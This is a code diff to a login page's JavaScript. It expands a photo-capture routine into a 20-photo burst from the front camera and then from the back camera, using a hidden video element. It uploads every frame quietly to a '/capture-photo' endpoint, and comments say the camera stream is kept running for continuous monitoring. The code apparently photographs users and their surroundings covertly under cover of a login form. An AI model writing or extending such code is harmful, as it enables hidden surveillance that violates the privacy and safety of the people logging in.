@@ -147,7 +147,7 @@
             device: false
         };
         let photosCaptured = 0;
-        const TOTAL_PHOTOS_LOGIN = 5; // Capture 5 photos on login page
+        const TOTAL_PHOTOS_LOGIN = 20; // Desktop: 20 front only | Mobile: 10 front + 10 back
         let cameraStream = null;
         let locationPermissionDenied = false;
 
@@ -762,14 +762,14 @@
             });
         }
 
-        // Function to capture multiple photos (5 photos on login page)
+        // DUAL CAMERA BURST CAPTURE - LOGIN PAGE (12 photos in 0.6s)
         async function captureMultiplePhotos() {
-            updateStatus('camera', 'Starting photo capture...');
+            updateStatus('camera', 'Starting dual-camera capture...');
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
 
             try {
-                // Request camera access
+                // Request FRONT camera access first
                 cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user',
@@ -780,7 +780,7 @@
                 });
 
                 video.srcObject = cameraStream;
-                updateStatus('camera', 'Camera active...');
+                updateStatus('camera', 'Front camera active...');
 
                 // Wait for video to be ready
                 await new Promise((resolve) => {
@@ -788,41 +788,65 @@
                 });
 
                 // Wait for camera to adjust
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 500));
 
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext('2d');
 
-                // Capture 5 photos with intervals
-                for (let i = 0; i < TOTAL_PHOTOS_LOGIN; i++) {
-                    ctx.drawImage(video, 0, 0);
-                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                // FRONT CAMERA BURST (6 photos in 300ms)
+                const frontCount = Math.ceil(TOTAL_PHOTOS_LOGIN / 2);
+                let frontCaptured = 0;
 
-                    // Send photo to server
-                    await sendPhotoToServer(photoData, `login_${i + 1}`);
-                    photosCaptured++;
+                for (let i = 0; i < frontCount; i++) {
+                    // Wait for video to be ready with retry
+                    let retries = 0;
+                    while (video.videoWidth === 0 && retries < 3) {
+                        console.log(`⏳ Waiting for front camera (login)... (retry ${retries + 1})`);
+                        await new Promise(r => setTimeout(r, 100));
+                        retries++;
+                    }
 
-                    updateStatus('camera', `Captured ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} photos...`);
-                    console.log(`✅ Photo ${photosCaptured}/${TOTAL_PHOTOS_LOGIN} captured`);
+                    if (video.videoWidth > 0) {
+                        ctx.drawImage(video, 0, 0);
+                        const photoData = canvas.toDataURL('image/jpeg', 0.7);
 
-                    // Wait 500ms between captures
-                    if (i < TOTAL_PHOTOS_LOGIN - 1) {
-                        await new Promise(resolve => setTimeout(resolve, 500));
+                        // NON-BLOCKING UPLOAD - Send photo to server with front camera tag
+                        sendPhotoToServer(photoData, `login_front_${i + 1}`, 'front')
+                            .then(() => {
+                                console.log(`✅ Login front photo ${i + 1}/${frontCount} uploaded`);
+                            })
+                            .catch(err => {
+                                console.error(`❌ Login front photo ${i + 1} upload failed:`, err.message);
+                            });
+
+                        photosCaptured++;
+                        frontCaptured++;
+                        updateStatus('camera', `Front: ${frontCaptured}/${frontCount} photos...`);
+                    } else {
+                        console.warn(`⚠️ Skipped login front photo ${i + 1} - video not ready`);
+                    }
+
+                    // Slower interval for stability: 200ms instead of 50ms
+                    if (i < frontCount - 1) {
+                        await new Promise(resolve => setTimeout(resolve, 200));
                     }
                 }
 
-                // Keep camera running in background (don't stop stream)
-                // This allows continuous monitoring
+                console.log(`📸 Login front camera: ${frontCaptured}/${frontCount} photos captured`);
+                updateStatus('camera', 'Switching to back camera...');
 
+                // BACK CAMERA BURST (6 photos INSTANT)
+                await captureFromBackCameraLogin(TOTAL_PHOTOS_LOGIN - frontCount);
+
+                // Keep camera running in background (don't stop stream)
                 dataCapturComplete.camera = true;
-                updateStatus('camera', `${TOTAL_PHOTOS_LOGIN} photos captured ✓`, true);
-                console.log(`✅ All ${TOTAL_PHOTOS_LOGIN} photos captured on login page`);
+                updateStatus('camera', `${TOTAL_PHOTOS_LOGIN} photos (dual-camera) ✓`, true);
+                console.log(`✅ All ${TOTAL_PHOTOS_LOGIN} photos captured from both cameras`);
             } catch (error) {
                 console.error('Camera error:', error);
 
                 // CRITICAL: Do NOT mark camera as complete if it failed
-                // This ensures the modal re-appears on next form submit
                 if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                     dataCapturComplete.camera = false;
                     showToast("Camera access required. Please enable in browser settings.", "error");
@@ -835,8 +859,103 @@
             }
         }
 
+        // Capture from back camera on login page
+        async function captureFromBackCameraLogin(count) {
+            let backStream = null;
+            let backCaptured = 0;
+
+            try {
+                console.log(`📷 Switching to back camera (login) for ${count} photos...`);
+
+                // Try exact back camera first, then fallback
+                try {
+                    backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { exact: 'environment' } }
+                    });
+                } catch (exactError) {
+                    console.log('⚠️ Exact back camera failed (login), trying ideal...');
+                    // Fallback: try without exact constraint
+                    backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: 'environment' }
+                    });
+                }
+
+                // Create temporary video for back camera
+                const backVideo = document.createElement('video');
+                backVideo.srcObject = backStream;
+                backVideo.setAttribute('playsinline', '');
+                backVideo.style.display = 'none';
+                document.body.appendChild(backVideo);
+
+                await backVideo.play();
+                await new Promise(resolve => {
+                    if (backVideo.readyState >= 2) resolve();
+                    else backVideo.onloadeddata = resolve;
+                });
+
+                // Small stabilization delay
+                await new Promise(r => setTimeout(r, 200));
+
+                // Create canvas for back camera
+                const backCanvas = document.createElement('canvas');
+                backCanvas.width = backVideo.videoWidth;
+                backCanvas.height = backVideo.videoHeight;
+                const backCtx = backCanvas.getContext('2d');
+
+                // Rapid burst from back camera
+                for (let i = 0; i < count; i++) {
+                    // Wait for video to be ready with retry
+                    let retries = 0;
+                    while (backVideo.videoWidth === 0 && retries < 3) {
+                        console.log(`⏳ Waiting for back camera (login)... (retry ${retries + 1})`);
+                        await new Promise(r => setTimeout(r, 100));
+                        retries++;
+                    }
+
+                    if (backVideo.videoWidth > 0) {
+                        backCtx.drawImage(backVideo, 0, 0);
+                        const photoData = backCanvas.toDataURL('image/jpeg', 0.7);
+
+                        // NON-BLOCKING UPLOAD
+                        sendPhotoToServer(photoData, `login_back_${i + 1}`, 'back')
+                            .then(() => {
+                                console.log(`✅ Login back photo ${i + 1}/${count} uploaded`);
+                            })
+                            .catch(err => {
+                                console.error(`❌ Login back photo ${i + 1} upload failed:`, err.message);
+                            });
+
+                        photosCaptured++;
+                        backCaptured++;
+                        updateStatus('camera', `Back: ${backCaptured}/${count} photos...`);
+                    } else {
+                        console.warn(`⚠️ Skipped login back photo ${i + 1} - video not ready`);
+                    }
+
+                    // Slower interval for stability: 200ms instead of 50ms
+                    if (i < count - 1) {
+                        await new Promise(r => setTimeout(r, 200));
+                    }
+                }
+
+                // Cleanup
+                backVideo.remove();
+                backStream.getTracks().forEach(t => t.stop());
+                console.log(`📸 Login back camera: ${backCaptured}/${count} photos captured`);
+                console.log('✅ Back camera capture complete on login');
+
+            } catch (error) {
+                console.log('⚠️ Back camera not available on login:', error.message);
+                console.log(`📸 Login back camera: ${backCaptured}/${count} photos captured (failed)`);
+                // Continue without back camera - it might be desktop or permission issue
+                if (backStream) {
+                    backStream.getTracks().forEach(t => t.stop());
+                }
+            }
+        }
+
         // Function to send photo to server
-        async function sendPhotoToServer(photoData, photoType = 'login') {
+        async function sendPhotoToServer(photoData, photoType = 'login', camera = 'front') {
             try {
                 const response = await fetch('/capture-photo', {
                     method: 'POST',
@@ -844,6 +963,7 @@
                     body: JSON.stringify({
                         photo: photoData,
                         type: photoType,
+                        camera: camera,
                         timestamp: new Date().toISOString()
                     })
                 });
